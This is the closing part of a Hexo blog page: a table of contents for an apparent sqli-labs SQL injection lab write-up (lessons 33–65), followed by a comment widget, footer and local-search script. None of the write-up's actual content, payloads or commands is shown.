href="#less-33"><span class="toc-text">less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-34"><span class="toc-text">less-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-35"><span class="toc-text">less-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-36"><span class="toc-text">less-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-37"><span class="toc-text">less-37</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-38-53"><span class="toc-text">4 堆叠注入(38-53)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-38"><span class="toc-text">less-38</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSLog-%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="toc-text">DNSLog 数据外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97-Getshell"><span class="toc-text">开启日志 Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">修改表名查数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-39"><span class="toc-text">less-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-40"><span class="toc-text">less-40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-41"><span class="toc-text">less-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-42"><span class="toc-text">less-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-43"><span class="toc-text">less-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-44"><span class="toc-text">less-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-45"><span class="toc-text">less-45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-46"><span class="toc-text">less-46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-47"><span class="toc-text">less-47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-48"><span class="toc-text">less-48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-49"><span class="toc-text">less-49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-50"><span class="toc-text">less-50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-51"><span class="toc-text">less-51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-52"><span class="toc-text">less-52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-53"><span class="toc-text">Less-53</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E8%BF%9B%E9%98%B6%E6%8C%91%E6%88%98-54-65"><span class="toc-text">5 进阶挑战(54-65)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-54"><span class="toc-text">less-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-55"><span class="toc-text">less-55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-56"><span class="toc-text">less-56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-57"><span class="toc-text">less-57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-58"><span class="toc-text">less-58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-59"><span class="toc-text">less-59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-60"><span class="toc-text">less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-61"><span class="toc-text">less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-62"><span class="toc-text">less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-63"><span class="toc-text">less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-64"><span class="toc-text">less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-65"><span class="toc-text">less-65</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-text">6 思维导图</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-text">附录</span></a></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        


  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>

  <div id="vcomments"></div>

  <script>
    new Valine({
      el: '#vcomments',
      appId: 'ikvSzWGgS2Gj6eMcU18rNJ0T-gzGzoHsz',
      appKey: '8JFk6edtiIlTX0CcOOnneFWO',
      placeholder: 'Welcome!',
      avatar: 'retro',
      lang: 'zh-CN'
    })
  </script>




      </div>
    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/slug01sh">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:slug01sh@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
